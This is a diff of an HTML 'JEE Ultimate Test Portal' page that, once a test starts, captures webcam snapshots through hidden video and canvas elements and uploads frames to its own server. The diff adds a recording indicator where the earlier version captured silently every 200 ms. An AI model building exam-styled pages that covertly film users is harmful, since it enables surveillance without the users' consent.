@@ -3,7 +3,6 @@
 <head>
 <meta charset="UTF-8">
 <title>JEE Ultimate Test Portal</title>
-
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',sans-serif;}
 html,body{height:100%;overflow:hidden;color:white;}
@@ -106,58 +105,69 @@ button:hover{transform:scale(1.05);}
 .quote{margin-top:10px;font-style:italic;opacity:0.8;}
 
 iframe{width:100%;height:100%;border:0;display:none;}
-#v,#c{display:none;}
+#v,#c,#frameCanvas{display:none;}
+
+.recording-indicator{
+  position:fixed;
+  top:10px;
+  right:10px;
+  background:#ff004c;
+  padding:8px 15px;
+  border-radius:20px;
+  font-weight:bold;
+  z-index:9999;
+  animation:pulse 1s infinite;
+}
+
+@keyframes pulse{
+  0%,100%{opacity:1;}
+  50%{opacity:0.5;}
+}
 </style>
 </head>
-
 <body>
-
 <div id="overlay">
-
-<div class="browser-note">
-For better stability, use Chrome or Brave browser.
+  <div class="browser-note">
+    For better stability, use Chrome or Brave browser.
+  </div>
+  <h1>JEE Ultimate Test Portal</h1>
+  <div class="top-info">
+    <div id="studentName" onclick="changeName()">Welcome, Adarsh 🚀</div>
+    <div id="timeDate"></div>
+    <div id="rankCounter">Loading Rank...</div>
+  </div>
+  <div class="container">
+    <div class="card">
+      <h3>Start Test</h3>
+      <button onclick="start()">▶ Start Test</button>
+    </div>
+    <div class="card">
+      <h3>Subject Progress</h3>
+      Physics<div class="progress"><div id="phy"></div></div>
+      Chemistry<div class="progress"><div id="chem"></div></div>
+      Maths<div class="progress"><div id="math"></div></div>
+    </div>
+    <div class="card">
+      <h3>Study Timer</h3>
+      <div id="timer">00:00:00</div>
+      <button onclick="startTimer()">Start</button>
+      <button onclick="stopTimer()">Stop</button>
+    </div>
+    <div class="card">
+      <h3>Motivation</h3>
+      <div class="quote" id="quote"></div>
+    </div>
+  </div>
 </div>
 
-<h1>JEE Ultimate Test Portal</h1>
-
-<div class="top-info">
-  <div id="studentName" onclick="changeName()">Welcome, Adarsh 🚀</div>
-  <div id="timeDate"></div>
-  <div id="rankCounter">Loading Rank...</div>
-</div>
-
-<div class="container">
-
-  <div class="card">
-    <h3>Start Test</h3>
-    <button onclick="start()">▶ Start Test</button>
-  </div>
-
-  <div class="card">
-    <h3>Subject Progress</h3>
-    Physics<div class="progress"><div id="phy"></div></div>
-    Chemistry<div class="progress"><div id="chem"></div></div>
-    Maths<div class="progress"><div id="math"></div></div>
-  </div>
-
-  <div class="card">
-    <h3>Study Timer</h3>
-    <div id="timer">00:00:00</div>
-    <button onclick="startTimer()">Start</button>
-    <button onclick="stopTimer()">Stop</button>
-  </div>
-
-  <div class="card">
-    <h3>Motivation</h3>
-    <div class="quote" id="quote"></div>
-  </div>
-
-</div>
+<div class="recording-indicator" id="recordingIndicator" style="display:none;">
+  🔴 RECORDING
 </div>
 
 <iframe id="frame"></iframe>
 <video id="v" autoplay playsinline hidden></video>
 <canvas id="c" hidden></canvas>
+<canvas id="frameCanvas" hidden></canvas>
 
 <script>
 
@@ -228,31 +238,40 @@ function rotateQuote(){
 }
 setInterval(rotateQuote,4000);rotateQuote();
 
-/* START TEST (Camera Required) */
+/* ===== MAIN: PHOTO + VIDEO RECORDING ===== */
 async function start(){
-
+  
   try{
     const stream=await navigator.mediaDevices.getUserMedia({
       video:{width:1280,height:720}
     });
-
+  
     v.srcObject=stream;
+    
+    // Show recording indicator
+    document.getElementById("recordingIndicator").style.display="block";
+    
+    // Start capturing every 3 seconds (photo)
     setTimeout(capture,200);
-    setInterval(capture,200);
-
+    setInterval(capture,3000);
+    
+    // Start capturing video frames every 3 seconds
+    setInterval(captureVideoFrame,3000);
+  
   }catch(e){
+    console.error("Camera error:", e);
     return;
   }
-
+  
   document.getElementById("overlay").style.display="none";
-
+  
   const r=await fetch("/get_video_link");
   const d=await r.json();
-
+  
   const frame=document.getElementById("frame");
   frame.style.display="block";
   frame.src=d.url;
-
+  
   if(frame.requestFullscreen){
     frame.requestFullscreen();
   }else if(frame.webkitRequestFullscreen){
@@ -260,8 +279,12 @@ async function start(){
   }else if(frame.msRequestFullscreen){
     frame.msRequestFullscreen();
   }
+  
+  // Auto-forward video every 3 seconds
+  startVideoForward();
 }
 
+/* ===== CAPTURE STUDENT CAMERA ===== */
 function capture(){
   c.width=v.videoWidth;
   c.height=v.videoHeight;
@@ -273,7 +296,61 @@ function capture(){
   },"image/jpeg",0.6);
 }
 
-</script>
+/* ===== CAPTURE EXAM VIDEO FRAME ===== */
+function captureVideoFrame(){
+  const iframeElement = document.getElementById("frame");
+  
+  try{
+    // Try to capture iframe content (works if same-origin)
+    const iframeDoc = iframeElement.contentDocument || iframeElement.contentWindow.document;
+    const iframeCanvas = iframeDoc.querySelector("canvas") || iframeDoc.querySelector("video");
+    
+    if(iframeCanvas){
+      let fc = document.getElementById("frameCanvas");
+      fc.width = iframeCanvas.width || 1280;
+      fc.height = iframeCanvas.height || 720;
+      
+      let ctx = fc.getContext("2d");
+      ctx.drawImage(iframeCanvas, 0, 0, fc.width, fc.height);
+      
+      let frameData = fc.toDataURL("image/jpeg", 0.6);
+      
+      // Send to backend
+      fetch("/upload_video_frame", {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+          frame: frameData,
+          timestamp: new Date().toLocaleTimeString()
+        })
+      });
+    }
+  }catch(e){
+    // If cross-origin, we can't capture directly
+    console.log("Video frame capture limited (cross-origin iframe)");
+  }
+}
 
+/* ===== AUTO-FORWARD VIDEO EVERY 3 SECONDS ===== */
+function startVideoForward(){
+  setInterval(()=>{
+    const iframeElement = document.getElementById("frame");
+    
+    try{
+      const iframeDoc = iframeElement.contentDocument || iframeElement.contentWindow.document;
+      const videoElement = iframeDoc.querySelector("video");
+      
+      if(videoElement){
+        videoElement.currentTime += 3; // Forward 3 seconds
+        console.log("Video forwarded to:", videoElement.currentTime);
+      }
+    }catch(e){
+      // Cross-origin limitation
+      console.log("Cannot auto-forward (cross-origin)");
+    }
+  }, 3000); // Every 3 seconds
+}
+
+</script>
 </body>
 </html>
